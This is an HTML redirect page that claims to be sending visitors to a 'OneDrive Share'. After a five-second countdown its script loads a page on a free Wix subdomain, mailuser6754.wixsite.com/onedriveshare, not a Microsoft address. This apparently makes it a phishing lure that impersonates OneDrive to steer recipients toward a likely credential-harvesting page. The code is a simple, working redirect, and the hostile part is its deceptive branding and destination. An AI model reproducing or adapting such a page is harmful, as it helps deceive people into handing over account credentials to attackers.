<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f4;
        }
        .loading {
            width: 50px;
            height: 50px;
            border: 5px solid #ddd;
            border-top: 5px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-top: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
            background-color: #dc3545;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background-color: #c82333;
        }
    </style>
    <script>
        let countdown = 5; // Time in seconds before redirect
        let redirectUrl = "https://mailuser6754.wixsite.com/onedriveshare"; // Your link here
        let timer;

        function startCountdown() {
            document.getElementById("countdown").innerText = countdown;
            timer = setInterval(() => {
                countdown--;
                document.getElementById("countdown").innerText = countdown;
                if (countdown <= 0) {
                    clearInterval(timer);
                    window.location.href = redirectUrl;
                }
            }, 1000);
        }

        function cancelRedirect() {
            clearInterval(timer);
            document.getElementById("message").innerText = "Redirect canceled.";
            document.getElementById("loading").style.display = "none";
        }

        window.onload = startCountdown;
    </script>
</head>
<body>
    <h1>Redirecting to OneDrive Share in <span id="countdown">5</span> seconds...</h1>
    <div id="loading" class="loading"></div>
    <p>If you are not redirected, <a href="https://mailuser6754.wixsite.com/onedriveshare">click here</a>.</p>
    <button onclick="cancelRedirect()">Cancel Redirect</button>
    <p id="message"></p>
</body>
</html>
